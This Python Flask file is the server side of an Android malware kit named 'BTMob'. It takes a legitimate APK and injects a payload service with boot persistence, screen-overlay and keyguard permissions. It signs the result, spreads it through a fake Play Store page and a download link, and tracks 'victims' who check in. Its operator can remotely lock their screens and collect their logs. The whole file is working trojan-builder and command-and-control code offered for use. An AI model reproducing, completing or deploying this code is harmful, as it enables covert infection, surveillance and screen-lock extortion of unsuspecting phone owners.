from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, send_file, abort
from flask_login import LoginManager, login_user, logout_user, login_required, current_user
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
import os
import uuid
import shutil
import subprocess
import zipfile
import tempfile
from datetime import datetime

from config import Config
from models import db, User, Campaign, Victim, Log

app = Flask(__name__)
app.config.from_object(Config)

db.init_app(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

with app.app_context():
    db.create_all()
    if not User.query.filter_by(username='admin').first():
        admin = User(username='admin', password_hash=generate_password_hash('admin123'))
        db.session.add(admin)
        db.session.commit()

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            return redirect(url_for('dashboard'))
        flash('Invalid credentials', 'error')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    campaigns = Campaign.query.filter_by(user_id=current_user.id).order_by(Campaign.created_at.desc()).all()
    total_victims = Victim.query.join(Campaign).filter(Campaign.user_id == current_user.id).count()
    active_locks = Victim.query.join(Campaign).filter(Campaign.user_id == current_user.id, Victim.screen_locked == True).count()
    return render_template('dashboard.html', campaigns=campaigns, total_victims=total_victims, active_locks=active_locks)

@app.route('/campaign/new', methods=['GET', 'POST'])
@login_required
def new_campaign():
    if request.method == 'POST':
        name = request.form.get('name')
        app_name = request.form.get('app_name')
        package_name = request.form.get('package_name')
        base_apk = request.files.get('base_apk')
        if not base_apk or not base_apk.filename.endswith('.apk'):
            flash('Upload a valid APK', 'error')
            return redirect(request.url)
        icon = request.files.get('icon')
        icon_path = None
        if icon and icon.filename:
            icon_filename = secure_filename(f"{uuid.uuid4()}_{icon.filename}")
            icon_path = os.path.join(Config.UPLOAD_FOLDER_ICONS, icon_filename)
            icon.save(icon_path)
        apk_filename = secure_filename(f"{uuid.uuid4()}_{base_apk.filename}")
        apk_path = os.path.join(Config.UPLOAD_FOLDER_APPS, apk_filename)
        base_apk.save(apk_path)
        campaign = Campaign(name=name, app_name=app_name, package_name=package_name,
                            icon_path=icon_path, base_apk_path=apk_path, user_id=current_user.id)
        db.session.add(campaign)
        db.session.commit()
        build_result = build_infected_apk(campaign)
        if build_result:
            campaign.built_apk_path = build_result
            db.session.commit()
            flash('Campaign created and APK built!', 'success')
        else:
            flash('Campaign created but APK build failed - you can rebuild later', 'warning')
        return redirect(url_for('dashboard'))
    return render_template('new_campaign.html')

@app.route('/campaign/<int:campaign_id>')
@login_required
def campaign_detail(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    if campaign.user_id != current_user.id:
        abort(403)
    victims = Victim.query.filter_by(campaign_id=campaign.id).order_by(Victim.last_seen.desc()).all()
    download_url = f"{Config.PANEL_DOMAIN}/download/{campaign.download_token}"
    return render_template('campaign_detail.html', campaign=campaign, victims=victims, download_url=download_url)

@app.route('/campaign/<int:campaign_id>/delete', methods=['POST'])
@login_required
def delete_campaign(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    if campaign.user_id != current_user.id:
        abort(403)
    for path in [campaign.base_apk_path, campaign.built_apk_path, campaign.icon_path]:
        if path and os.path.exists(path):
            os.remove(path)
    db.session.delete(campaign)
    db.session.commit()
    flash('Campaign deleted', 'success')
    return redirect(url_for('dashboard'))

@app.route('/api/victim/<int:victim_id>/lock', methods=['POST'])
@login_required
def lock_screen(victim_id):
    victim = Victim.query.get_or_404(victim_id)
    if victim.campaign.user_id != current_user.id:
        abort(403)
    data = request.get_json() or {}
    victim.screen_locked = True
    victim.lock_type = data.get('type', 'update')
    db.session.commit()
    return jsonify({'status': 'ok', 'message': f'Screen locked with {victim.lock_type}'})

@app.route('/api/victim/<int:victim_id>/unlock', methods=['POST'])
@login_required
def unlock_screen(victim_id):
    victim = Victim.query.get_or_404(victim_id)
    if victim.campaign.user_id != current_user.id:
        abort(403)
    victim.screen_locked = False
    victim.lock_type = None
    db.session.commit()
    return jsonify({'status': 'ok', 'message': 'Screen unlocked'})

@app.route('/api/victim/<int:victim_id>/logs')
@login_required
def get_victim_logs(victim_id):
    victim = Victim.query.get_or_404(victim_id)
    if victim.campaign.user_id != current_user.id:
        abort(403)
    logs = Log.query.filter_by(victim_id=victim.id).order_by(Log.timestamp.desc()).limit(100).all()
    return jsonify([{'event_type': l.event_type, 'data': l.data, 'timestamp': l.timestamp.isoformat()} for l in logs])

@app.route('/download/<token>')
def download_apk(token):
    campaign = Campaign.query.filter_by(download_token=token, active=True).first()
    if not campaign or not campaign.built_apk_path or not os.path.exists(campaign.built_apk_path):
        abort(404)
    campaign.download_count += 1
    db.session.commit()
    return send_file(campaign.built_apk_path, as_attachment=True,
                     download_name=f"{campaign.app_name.replace(' ', '_')}.apk",
                     mimetype='application/vnd.android.package-archive')

@app.route('/api/check-in', methods=['POST'])
def victim_checkin():
    data = request.get_json() or {}
    device_id = data.get('device_id')
    campaign_token = data.get('campaign_token')
    if not device_id or not campaign_token:
        return jsonify({'error': 'Missing parameters'}), 400
    campaign = Campaign.query.filter_by(download_token=campaign_token).first()
    if not campaign:
        return jsonify({'error': 'Invalid campaign'}), 404
    victim = Victim.query.filter_by(device_id=device_id, campaign_id=campaign.id).first()
    if not victim:
        victim = Victim(device_id=device_id, device_model=data.get('device_model'),
                        android_version=data.get('android_version'),
                        ip_address=request.remote_addr, campaign_id=campaign.id)
        db.session.add(victim)
    victim.last_seen = datetime.utcnow()
    victim.ip_address = request.remote_addr
    db.session.commit()
    return jsonify({'screen_locked': victim.screen_locked, 'lock_type': victim.lock_type,
                    'command': 'lock' if victim.screen_locked else 'idle'})

@app.route('/api/log', methods=['POST'])
def victim_log():
    data = request.get_json() or {}
    campaign = Campaign.query.filter_by(download_token=data.get('campaign_token')).first()
    if not campaign:
        return jsonify({'error': 'Invalid campaign'}), 404
    victim = Victim.query.filter_by(device_id=data.get('device_id'), campaign_id=campaign.id).first()
    if not victim:
        return jsonify({'error': 'Victim not found'}), 404
    log = Log(event_type=data.get('event_type', 'unknown'), data=data.get('data'), victim_id=victim.id)
    db.session.add(log)
    db.session.commit()
    return jsonify({'status': 'ok'})

def build_infected_apk(campaign):
    try:
        base_apk = campaign.base_apk_path
        output_dir = os.path.join(Config.UPLOAD_FOLDER_BUILT, str(campaign.id))
        os.makedirs(output_dir, exist_ok=True)
        output_apk = os.path.join(output_dir, f"infected_{campaign.id}.apk")
        shutil.copy2(base_apk, output_apk)
        try:
            inject_payload(output_apk, campaign)
        except Exception as e:
            print(f"Payload injection failed: {e}")
        try:
            sign_apk(output_apk)
        except Exception as e:
            print(f"Signing failed: {e}")
        return output_apk
    except Exception as e:
        print(f"Build error: {e}")
        return None

def inject_payload(apk_path, campaign):
    work_dir = tempfile.mkdtemp(prefix="btmob_build_")
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            zip_ref.extractall(work_dir)
        manifest_path = os.path.join(work_dir, 'AndroidManifest.xml')
        if os.path.exists(manifest_path):
            with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
                manifest = f.read()
            perms_to_add = [
                '    <uses-permission android:name="android.permission.INTERNET" />',
                '    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
                '    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />',
                '    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />',
                '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />',
                '    <uses-permission android:name="android.permission.WAKE_LOCK" />',
                '    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />',
            ]
            app_idx = manifest.find('<application')
            if app_idx != -1:
                manifest = manifest[:app_idx] + '\n'.join(perms_to_add) + '\n' + manifest[app_idx:]
            payload_components = """
    <service android:name="com.btmob.payload.CoreService" android:exported="false" />
    <receiver android:name="com.btmob.payload.BootReceiver" android:exported="true">
        <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED" /></intent-filter>
    </receiver>
"""
            manifest = manifest.replace('</application>', payload_components + '</application>')
            with open(manifest_path, 'w', encoding='utf-8') as f:
                f.write(manifest)
        payload_smali_dir = os.path.join(work_dir, 'smali', 'com', 'btmob', 'payload')
        os.makedirs(payload_smali_dir, exist_ok=True)
        panel_url = Config.PANEL_DOMAIN + "/api"
        core_service_smali = """.class public Lcom/btmob/payload/CoreService;
.super Landroid/app/Service;
.source "CoreService.java"

.field private static final TAG:Ljava/lang/String; = "BTMob"
.field private static final PANEL_URL:Ljava/lang/String; = "PANEL_URL_PLACEHOLDER"
.field private static final CAMPAIGN_TOKEN:Ljava/lang/String; = "CAMPAIGN_TOKEN_PLACEHOLDER"
.field private scheduler:Ljava/util/concurrent/ScheduledExecutorService;
.field private deviceId:Ljava/lang/String;
.field private mainHandler:Landroid/os/Handler;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onCreate()V
    .locals 2
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    new-instance v0, Landroid/os/Handler;
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
    move-result-object v1
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
    iput-object v0, p0, Lcom/btmob/payload/CoreService;->mainHandler:Landroid/os/Handler;
    invoke-virtual {p0}, Lcom/btmob/payload/CoreService;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0
    const-string v1, "android_id"
    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    iput-object v0, p0, Lcom/btmob/payload/CoreService;->deviceId:Ljava/lang/String;
    invoke-virtual {p0}, Lcom/btmob/payload/CoreService;->startForegroundService()V
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 7
    iget-object v0, p0, Lcom/btmob/payload/CoreService;->scheduler:Ljava/util/concurrent/ScheduledExecutorService;
    if-eqz v0, :cond_0
    invoke-interface {v0}, Ljava/util/concurrent/ScheduledExecutorService;->isShutdown()Z
    move-result v0
    if-eqz v0, :cond_1
    :cond_0
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadScheduledExecutor()Ljava/util/concurrent/ScheduledExecutorService;
    move-result-object v0
    iput-object v0, p0, Lcom/btmob/payload/CoreService;->scheduler:Ljava/util/concurrent/ScheduledExecutorService;
    new-instance v1, Lcom/btmob/payload/CoreService$1;
    invoke-direct {v1, p0}, Lcom/btmob/payload/CoreService$1;-><init>(Lcom/btmob/payload/CoreService;)V
    const-wide/16 v2, 0x0
    const-wide/16 v4, 0x5
    sget-object v6, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;
    invoke-interface/range {v0 .. v6}, Ljava/util/concurrent/ScheduledExecutorService;->scheduleAtFixedRate(Ljava/lang/Runnable;JJLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;
    :cond_1
    const/4 v0, 0x1
    return v0
.end method

.method private startForegroundService()V
    .locals 4
    const-string v0, "btmob_channel"
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v2, 0x1a
    if-lt v1, v2, :cond_0
    new-instance v1, Landroid/app/NotificationChannel;
    const/4 v2, 0x2
    const-string v3, "BT Mob Service"
    invoke-direct {v1, v0, v3, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V
    const-string v2, "notification"
    invoke-virtual {p0, v2}, Lcom/btmob/payload/CoreService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v2
    check-cast v2, Landroid/app/NotificationManager;
    invoke-virtual {v2, v1}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
    :cond_0
    new-instance v1, Landroid/app/Notification$Builder;
    invoke-direct {v1, p0, v0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V
    const-string v0, "Sistema"
    invoke-virtual {v1, v0}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    move-result-object v0
    const-string v1, "Servico em execucao"
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    move-result-object v0
    const v1, 0x1080040
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
    move-result-object v0
    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
    move-result-object v0
    const/4 v1, 0x1
    invoke-virtual {p0, v1, v0}, Lcom/btmob/payload/CoreService;->startForeground(ILandroid/app/Notification;)V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0
    const/4 v0, 0x0
    return-object v0
.end method

.method public onDestroy()V
    .locals 1
    iget-object v0, p0, Lcom/btmob/payload/CoreService;->scheduler:Ljava/util/concurrent/ScheduledExecutorService;
    if-eqz v0, :cond_0
    invoke-interface {v0}, Ljava/util/concurrent/ScheduledExecutorService;->isShutdown()Z
    move-result v0
    if-nez v0, :cond_0
    iget-object v0, p0, Lcom/btmob/payload/CoreService;->scheduler:Ljava/util/concurrent/ScheduledExecutorService;
    invoke-interface {v0}, Ljava/util/concurrent/ScheduledExecutorService;->shutdown()V
    :cond_0
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V
    return-void
.end method
"""
        core_service_smali = core_service_smali.replace("PANEL_URL_PLACEHOLDER", panel_url)
        core_service_smali = core_service_smali.replace("CAMPAIGN_TOKEN_PLACEHOLDER", campaign.download_token)
        with open(os.path.join(payload_smali_dir, 'CoreService.smali'), 'w') as f:
            f.write(core_service_smali)
        os.remove(apk_path)
        with zipfile.ZipFile(apk_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(work_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, work_dir)
                    zipf.write(file_path, arcname)
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)

def sign_apk(apk_path):
    keystore = os.path.join(os.path.dirname(__file__), 'builder', 'debug.keystore')
    os.makedirs(os.path.dirname(keystore), exist_ok=True)
    if not os.path.exists(keystore):
        subprocess.run([
            'keytool', '-genkey', '-v', '-keystore', keystore,
            '-alias', 'androiddebugkey', '-storepass', 'android',
            '-keypass', 'android', '-keyalg', 'RSA', '-validity', '10000',
            '-dname', 'CN=Android Debug,O=Android,C=US'
        ], capture_output=True)
    try:
        subprocess.run([
            'apksigner', 'sign', '--ks', keystore, '--ks-pass', 'pass:android',
            '--key-pass', 'pass:android', apk_path
        ], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        try:
            subprocess.run([
                'jarsigner', '-verbose', '-sigalg', 'SHA1withRSA',
                '-digestalg', 'SHA1', '-keystore', keystore,
                '-storepass', 'android', apk_path, 'androiddebugkey'
            ], capture_output=True, check=True)
        except Exception:
            pass

@app.route('/store/<token>')
def playstore_page(token):
    campaign = Campaign.query.filter_by(download_token=token, active=True).first()
    if not campaign:
        abort(404)
    icon_url = url_for('static', filename='default_icon.png')
    if campaign.icon_path and os.path.exists(campaign.icon_path):
        icon_url = f"{Config.PANEL_DOMAIN}/uploads/icons/{os.path.basename(campaign.icon_path)}"
    download_url = f"{Config.PANEL_DOMAIN}/download/{campaign.download_token}"
    return render_template('playstore.html', campaign=campaign, icon_url=icon_url, download_url=download_url)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)